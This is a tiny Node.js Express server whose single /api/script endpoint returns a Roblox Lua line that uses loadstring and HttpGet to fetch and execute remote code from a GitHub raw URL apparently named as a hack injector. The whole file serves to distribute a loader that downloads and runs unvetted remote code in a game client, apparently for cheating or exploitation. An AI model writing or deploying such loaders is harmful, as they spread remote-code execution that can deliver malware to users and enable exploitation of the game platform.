const express = require('express');
const app = express();

app.get('/api/script', (req, res) => {
  const code = `loadstring(game:HttpGet("https://raw.githubusercontent.com/SrDark222/x64-Windos-Hack/refs/heads/main/inject"))()`;
  res.type('text/plain');
  res.send(code);
});

app.listen(3000);
